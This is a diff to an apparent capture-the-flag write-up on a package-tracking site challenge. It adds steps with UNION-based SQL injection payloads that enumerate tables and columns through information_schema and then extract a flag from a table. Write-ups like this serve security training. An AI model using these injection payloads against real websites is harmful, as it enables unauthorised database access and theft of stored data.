@@ -21,9 +21,21 @@ The system displayed the tracking website that has the illegal package's trackin
 -1' UNION SELECT null,null,null,null,null,@@version-- 
 ```
 
-8. After get the version and what type of the database, we can figure out how their syntax to enter. Enter next command:
+8. After get the version and what type of the database, we can figure out how their syntax to enter. Find out how to list all the databases and enter next command:
 
 ```
--1' UNION SELECT null,null,null,null,null,information.-- 
+-1' UNION SELECT null,null,null,null,null,TABLE_NAME FROM information_schema.tables-- 
 ```
 
+9. It will list out all tables that available and found w0wg00d that look suspicious.
+10. After that need to list out all the columns that available by entering the command below:
+
+```
+-1' UNION SELECT null,null,null,null,null,COLUMN_NAME FROM information_schema.columns-- 
+```
+
+11. From both information we get, we can retrieve all data from other table by entering command below and found the flag
+
+```
+-1' UNION SELECT null,null,null,null,null,f0undM3 FROM w0wg00d-- 
+```
